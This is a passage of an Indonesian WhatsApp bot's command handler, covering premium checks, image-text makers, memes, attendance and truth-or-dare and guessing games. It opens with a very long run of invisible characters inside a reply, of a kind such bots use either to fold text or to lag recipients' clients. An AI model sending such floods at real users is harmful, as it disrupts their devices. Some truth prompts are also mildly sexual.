‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎')
  break
  case 'rulesgroup': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
  reply(`*Desc :* \n${groupMetadata.desc}`)
  break
  case 'bay': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
  reply(`Sayonara buat yang pergi😔\n Semoga amal ibadahnya di terima :)`)
  break
  case 'selamatdatang': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
  reply('welcome kak jangan lupa patuhi peraturan  grup ya kaka \n Semoga betah👏')
  break
case 'groupbot': 
case 'botgroup': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
reply(`Grup 1 :
https://chat.whatsapp.com/GDZOBuMkFSCKw6mzDUDoPd
Grup 2 :
https://chat.whatsapp.com/G64dsAUKQFx4QO8n9dBybj`)
break
case "runtime":
case "test":
run = process.uptime();
teks = `*${kyun(run)}*`;
reply(teks);
break
case "speed":
case "ping":
timestamp = speed();
latensi = speed() - timestamp;
exec(`neofetch --stdout`, (error, stdout, stderr) => {
child = stdout.toString("utf-8");
ssd = child.replace(/Memory:/, "Ram:");
pingnya = `*${ssd}Speed: ${latensi.toFixed(4)} Second*`;
reply(pingnya);
});
break
case 'premiumcheck': 
case 'cekpremium': 
if (!isPremium) return sendButMessage (mess.only.prem)
const cekExp = ms(await premium.getPremiumExpired(sender, _premium) - Date.now())
reply(`*「 PREMIUM EXPIRE 」*\n\n➸ *ID*: ${sender}\n➸ *Premium left*: ${cekExp.days} day(s) ${cekExp.hours} hour(s) ${cekExp.minutes} minute(s)`)
break
case 'listprem': 
case 'listpremium':          
let txt = `「 *PREMIUM USER LIST* 」\n\n`
let men = [];
for (let i of _premium){
men.push(i.id)
const checkExp = ms(i.expired - Date.now())
txt += `➸ *ID :* @${i.id.split("@")[0]}\n➸ *Expired*: ${checkExp.days} day(s) ${checkExp.hours} hour(s) ${checkExp.minutes} minute(s)\n\n`
}
mentions(txt, men, true)
break

//━━━━━━━━━━━━━━━[ FITUR MAKER ]━━━━━━━━━━━━━━━━━//

case 'blackpink': 
case 'neon': 
case 'greenneon': 
case 'advanceglow': 
case 'futureneon': 
case 'sandwriting': 
case 'sandsummer': 
case 'sandengraved': 
case 'metaldark': 
case 'neonlight': 
case 'holographic': 
case 'text1917': 
case 'minion': 
case 'deluxesilver': 
case 'newyearcard': 
case 'bloodfrosted': 
case 'halloween': 
case 'jokerlogo': 
case 'fireworksparkle': 
case 'natureleaves': 
case 'bokeh': 
case 'toxic': 
case 'strawberry': 
case 'box3d': 
case 'roadwarning': 
case 'breakwall': 
case 'icecold': 
case 'luxury': 
case 'cloud': 
case 'summersand': 
case 'horrorblood': 
case 'thunder': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (args.length < 1) return reply('*Teks nya mana?*')
reply(mess.wait)
ini_txt = args.join(" ")
anu = await getBuffer(`https://api.lolhuman.xyz/api/textprome/${command}?apikey=${lolkey}&text=${ini_txt}`)
zeroyt7.sendMessage(from,anu,image,{quoted:fstatus,caption: 'Nih Kak',thumbnail: Buffer.alloc(0)})
break
case 'wetglass': 
case 'multicolor3d': 
case 'watercolor': 
case 'luxurygold': 
case 'galaxywallpaper': 
case 'lighttext': 
case 'beautifulflower': 
case 'puppycute': 
case 'royaltext': 
case 'heartshaped': 
case 'birthdaycake': 
case 'galaxystyle': 
case 'hologram3d': 
case 'greenneon': 
case 'glossychrome': 
case 'greenbush': 
case 'metallogo': 
case 'noeltext': 
case 'glittergold': 
case 'textcake': 
case 'starsnight': 
case 'wooden3d': 
case 'textbyname': 
case 'writegalacy': 
case 'galaxybat': 
case 'snow3d': 
case 'birthdayday': 
case 'goldplaybutton': 
case 'silverplaybutton': 
case 'freefire': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (args.length < 1) return reply('*Teks nya mana?*')
reply(mess.wait)
ini_txt = args.join(" ")
anu = await getBuffer(`https://api.lolhuman.xyz/api/ephoto1/${command}?apikey=${lolkey}&text=${ini_txt}`)
zeroyt7.sendMessage(from,anu,image,{quoted:fstatus,caption: 'Nih Kak',thumbnail: Buffer.alloc(0)})
break

//━━━━━━━━━━━━━━━[ FITUR RANDOM MEME ]━━━━━━━━━━━━━━━━━//

case 'meme': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
await getBuffer(`https://api.lolhuman.xyz/api/random/meme?apikey=${lolkey}`).then((gambar) => {
reply(mess.wait)
zeroyt7.sendMessage(from, gambar, image, {quoted: fstatus, caption: 'Dark Ajg', thumbnail: Buffer.alloc(0)})
})
break
case 'darkjoke': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
await getBuffer(`https://api.lolhuman.xyz/api/meme/darkjoke?apikey=${lolkey}`).then((gambar) => {
reply(mess.wait)
zeroyt7.sendMessage(from, gambar, image, {quoted: fstatus, caption: 'Dark Ajg', thumbnail: Buffer.alloc(0)})
})
break
case 'memeindo': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
await getBuffer(`https://api.lolhuman.xyz/api/meme/memeindo?apikey=${lolkey}`).then((gambar) => {
reply(mess.wait)
zeroyt7.sendMessage(from, gambar, image, {quoted: fstatus, caption: 'Dark Ajg', thumbnail: Buffer.alloc(0)})
})
break

//━━━━━━━━━━━━━━━[ FITUR GAME ]━━━━━━━━━━━━━━━━━//

case 'absensi': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (!isGroup) return reply(mess.only.group)
absen.push(sender)
fs.writeFileSync('./F2/absen.json', JSON.stringify(absen))
teks = `*LIST DAFTAR HADIR ABSEN*:\n`
for (let sender of absen) {
teks += `\n々 @${sender.split('@')[0]} ✓\n`
}
teks += `TOTAL MEMBER YG ABSEN : ${absen.length}\n\nKetik ${prefix}absensi untuk absen, Daftar list absen akan dikumpulkan setelah waktu yang diberikan telah berakhir!`
zeroyt7.sendMessage(from, teks.trim(), extendedText, {quoted: mek, contextInfo: {"mentionedJid": absen}})
break
case 'absen': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (!isGroup) return reply(mess.only.group)
if (args.length < 1) return reply(`Cara Memulai Absen Silahkan Ketik\n\n${prefix}absen waktu\n\nlist menit yang tersedia.\n\n600000 | 1200000 | 1800000\n\njadi ${prefix}absen 600000`)
tem = args.join(" ")
ini = absen.indexOf(from)
absen.splice(ini, 1)
fs.writeFileSync('./F2/absen.json', JSON.stringify(absen))
teks = `*LIST DAFTAR HADIR*:\n`
for (let sender of absen) {
teks += `\n々 @${sender.split('@')[0]} ✓\n`
}
teks += `Absensi : ${sender.length}\n\nKetik ${prefix}absensi untuk absen, Daftar list absen akan dikumpulkan setelah waktu yang diberikan telah berakhir!`
reply(`List Presentasi Hadir Telah Siap\n\nKetik ${prefix}absensi untuk absen, Daftar list absen akan dikumpulkan setelah waktu yang diberikan telah berakhir!`)
setTimeout( () => {
reply(`Waktu Absensi Telah Habis`)
zeroyt7.sendMessage(from, teks.trim(), extendedText, {quoted: mek, contextInfo: {"mentionedJid": absen}})
}, tem)
setTimeout( () => {
ini = absen.indexOf(from)
absen.splice(ini, 1)
fs.writeFileSync('./F4/absen.json', JSON.stringify(absen))
}, tem)
break
case 'truth': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
const trut =['Pernah suka sama siapa aja? berapa lama?','Kalau boleh atau kalau mau, di gc/luar gc siapa yang akan kamu jadikan sahabat?(boleh beda/sma jenis)','apa ketakutan terbesar kamu?','pernah suka sama orang dan merasa orang itu suka sama kamu juga?','Siapa nama mantan pacar teman mu yang pernah kamu sukai diam diam?','pernah gak nyuri uang nyokap atau bokap? Alesanya?','hal yang bikin seneng pas lu lagi sedih apa','pernah cinta bertepuk sebelah tangan? kalo pernah sama siapa? rasanya gimana brou?','pernah jadi selingkuhan orang?','hal yang paling ditakutin','siapa orang yang paling berpengaruh kepada kehidupanmu','hal membanggakan apa yang kamu dapatkan di tahun ini','siapa orang yang bisa membuatmu sange','siapa orang yang pernah buatmu sange','(bgi yg muslim) pernah ga solat seharian?','Siapa yang paling mendekati tipe pasangan idealmu di sini','suka mabar(main bareng)sama siapa?','pernah nolak orang? alasannya kenapa?','Sebutkan kejadian yang bikin kamu sakit hati yang masih di inget','pencapaian yang udah didapet apa aja ditahun ini?','kebiasaan terburuk lo pas di sekolah apa?']
const ttrth = trut[Math.floor(Math.random() * trut.length)]
truteh = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
zeroyt7.sendMessage(from, truteh, image, { caption: '*Truth*\n\n'+ ttrth, quoted: fstatus })
break
case 'dare': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
const dare =['Kirim pesan ke mantan kamu dan bilang "aku masih suka sama kamu','telfon crush/pacar sekarang dan ss ke pemain','pap ke salah satu anggota grup','Bilang "KAMU CANTIK BANGET NGGAK BOHONG" ke cowo','ss recent call whatsapp','drop emot "??💨" setiap ngetik di gc/pc selama 1 hari','kirim voice note bilang can i call u baby?','drop kutipan lagu/quote, terus tag member yang cocok buat kutipan itu','pake foto sule sampe 3 hari','ketik pake bahasa daerah 24 jam','ganti nama menjadi "gue anak lucinta luna" selama 5 jam','chat ke kontak wa urutan sesuai %batre kamu, terus bilang ke dia "i lucky to hv you','prank chat mantan dan bilang " i love u, pgn balikan','record voice baca surah al-kautsar','bilang "i hv crush on you, mau jadi pacarku gak?" ke lawan jenis yang terakhir bgt kamu chat (serah di wa/tele), tunggu dia bales, kalo udah ss drop ke sini','sebutkan tipe pacar mu!','snap/post foto pacar/crush','teriak gajelas lalu kirim pake vn kesini','pap mukamu lalu kirim ke salah satu temanmu','kirim fotomu dengan caption, aku anak pungut','teriak pake kata kasar sambil vn trus kirim kesini','teriak " anjimm gabutt anjimmm " di depan rumah mu','ganti nama jadi " BOWO " selama 24 jam','Pura pura kerasukan, contoh : kerasukan maung, kerasukan belalang, kerasukan kulkas, dll']
const der = dare[Math.floor(Math.random() * dare.length)]
dera = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
zeroyt7.sendMessage(from, dera, image, { caption: '*dare*\n\n'+ der, quoted: fstatus })
break
case 'slot': 
case 'slots': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
const somtoy = sotoy[Math.floor(Math.random() * sotoy.length)]
zeroyt7.sendMessage(from, `[  🎰 | SLOTS ]\n-----------------\n🍋 : 🍌 : 🍍\n${somtoy}<=====\n🍋 : 🍌 : 🍍\n[  🎰 | SLOTS ]\n\nKeterangan : Jika anda Mendapatkan 3Buah Sama Berarti Anda Menang\n\nContoh : 🍌 : 🍌 : 🍌<=====`, MessageType.text, { quoted: mek })
break
case 'tebakkalimat': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
anu = await fetchJson(`https://velgrynd.herokuapp.com/api/tebak/kalimat`, {method: 'get'})
get = `*${anu.result.soal}*`
setTimeout( () => {
zeroyt7.sendMessage(from, 'Jawaban: '
+anu.result.jawaban, text, {quoted: fstatus})
}, 60000) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, '_10 Detik lagi..._', text)
}, 50000) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, '_20 Detik lagi..._', text)
}, 40000) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, '_30 Detik lagi..._', text)
}, 30000) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, '_40 Detik lagi..._', text)
}, 20000) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, '_50 Detik lagi..._', text)
}, 10000) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, '_60 Detik lagi..._', text)
}, 2500) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, get, text, {quoted: fstatus})
}, 0) // 1000 = 1s,
break
case 'tebaktebakan': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
anu = await fetchJson(`https://velgrynd.herokuapp.com/api/tebak/tebakan`, {method: 'get'})
get = `*${anu.result.soal}*`
setTimeout( () => {
zeroyt7.sendMessage(from, 'Jawaban: '
+anu.result.jawaban, text, {quoted: fstatus}) 
}, 60000) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, '_10 Detik lagi..._', text) 
}, 50000) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, '_20 Detik lagi..._', text) 
}, 40000) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, '_30 Detik lagi..._', text)
}, 30000) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, '_40 Detik lagi..._', text) 
}, 20000) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, '_50 Detik lagi..._', text) 
}, 10000) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, '_60 Detik lagi..._', text)
}, 2500) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, get, text, {quoted: fstatus})
}, 0) // 1000 = 1s,
break
case 'tebaklirik': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
anu = await fetchJson(`https://velgrynd.herokuapp.com/api/tebak/lirik`, {method: 'get'})
get = `*${anu.result.question}*`
setTimeout( () => {
zeroyt7.sendMessage(from, 'Jawaban: '
+anu.result.answer, text, {quoted: fstatus}) 
}, 60000) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, '_10 Detik lagi..._', text) 
}, 50000) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, '_20 Detik lagi..._', text) 
}, 40000) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, '_30 Detik lagi..._', text) 
}, 30000) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, '_40 Detik lagi..._', text) 
}, 20000) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, '_50 Detik lagi..._', text) 
}, 10000) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, '_60 Detik lagi..._', text) 
}, 2500) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, get, text, {quoted: fstatus})
}, 0) // 1000 = 1s,
break
case 'tebakkimia': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
anu = await fetchJson(`https://velgrynd.herokuapp.com/api/tebak/kimia`, {method: 'get'})
get = `*${anu.result.nama}*`
setTimeout( () => {
zeroyt7.sendMessage(from, 'Jawaban: '
+anu.result.lambang, text, {quoted: fstatus}) 
}, 60000) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, '_10 Detik lagi..._', text) 
}, 50000) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, '_20 Detik lagi..._', text)
}, 40000) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, '_30 Detik lagi..._', text)
}, 30000) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, '_40 Detik lagi..._', text)
}, 20000) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, '_50 Detik lagi..._', text) 
}, 10000) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, '_60 Detik lagi..._', text) 
}, 2500) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, get, text, {quoted: fstatus}) 
}, 0) // 1000 = 1s,
break
case 'tebakjenaka': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
anu = await fetchJson(`https://velgrynd.herokuapp.com/api/tebak/jenaka`, {method: 'get'})
tebakjenaka = `*${anu.result.pertanyaan}*`
setTimeout( () => {
zeroyt7.sendMessage(from, 'Jawaban: '
+anu.result.jawaban, text, {quoted: fstatus}) 
}, 60000) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, '_10 Detik lagi..._', text) 
}, 50000) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, '_20 Detik lagi..._', text) 
}, 40000) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, '_30 Detik lagi..._', text) 
}, 30000) // 1000 = 1s,
setTimeout( () => {
